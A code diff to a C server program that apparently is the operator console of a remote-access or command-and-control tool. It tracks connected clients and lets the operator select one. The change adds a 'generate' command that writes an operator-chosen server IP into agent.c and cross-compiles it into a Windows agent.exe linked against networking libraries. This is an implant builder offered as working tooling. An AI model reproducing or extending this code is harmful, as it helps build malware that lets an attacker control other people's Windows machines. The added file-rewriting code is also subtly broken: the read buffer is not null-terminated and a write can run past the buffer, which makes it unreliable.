@@ -20,6 +20,9 @@
  #define MAX_CLIENTS 10
  #define BUFFER_SIZE 1024
  #define RESPONSE_BUFFER_SIZE 18384
+
+ #define SOURCE_AGENT_FILE "agent.c"
+ #define OUTPUT_AGENT_FILE "agent.exe"
  
  typedef struct {
      int socket;                 /**< Socket descriptor of the client. */
@@ -132,6 +135,65 @@
      return strspn(str, " \t\n\r") == strlen(str);
  }
  
+
+void update_agent_file(const char *new_ip) {
+    FILE *file = fopen(SOURCE_AGENT_FILE, "r");
+    if (!file) {
+        printf("Error: Could not open %s\n", SOURCE_AGENT_FILE);
+        return;
+    }
+
+    char buffer[8192];
+    fread(buffer, 1, sizeof(buffer), file);
+    fclose(file);
+
+    char new_define[256];
+    snprintf(new_define, sizeof(new_define), "#define SERVER_IP \"%s\"", new_ip);
+    char *old_define = strstr(buffer, "#define SERVER_IP");
+    
+    if (!old_define) {
+        printf("Error: IP line not found in code.\n");
+        return;
+    }
+
+    file = fopen(SOURCE_AGENT_FILE, "w");
+    if (!file) {
+        printf("Error: Could not write to %s\n", SOURCE_AGENT_FILE);
+        return;
+    }
+
+    fwrite(buffer, 1, old_define - buffer, file);
+    fprintf(file, "%s\n", new_define);
+    fwrite(old_define + strcspn(old_define, "\n") + 1, 1, strlen(old_define), file);
+    fclose(file);
+
+    printf("IP updated on %s to %s\n", SOURCE_AGENT_FILE, new_ip);
+}
+
+void compile_agent() {
+    char command[256];
+    snprintf(command, sizeof(command), "i686-w64-mingw32-gcc -o %s %s -lwininet -lwsock32", OUTPUT_AGENT_FILE, SOURCE_AGENT_FILE);
+
+    printf("Compiling the new agent...");
+    int result = system(command);
+    if (result == 0) {
+        printf("Compilation successful: %s generated.\n", OUTPUT_AGENT_FILE);
+    } else {
+        printf("Compilation error.\n");
+    }
+}
+
+void generate_agent_with_ip() {
+    char new_ip[16];
+
+    printf("Enter the new IP for the agent: ");
+    fgets(new_ip, sizeof(new_ip), stdin);
+    strtok(new_ip, "\n");
+
+    update_agent_file(new_ip);
+    compile_agent();
+}
+
  /**
   * @brief Displays a list of available server commands.
   * 
@@ -173,6 +235,9 @@
          strtok(command, "\n");
          if (strncmp(command, "clients", 7) == 0) {
              list_clients();
+         }
+         else if (strncmp(command, "generate", 8) == 0) {
+            generate_agent_with_ip();
          }
          else if (strncmp(command, "select ", 7) == 0) {
              int index = atoi(command + 7);
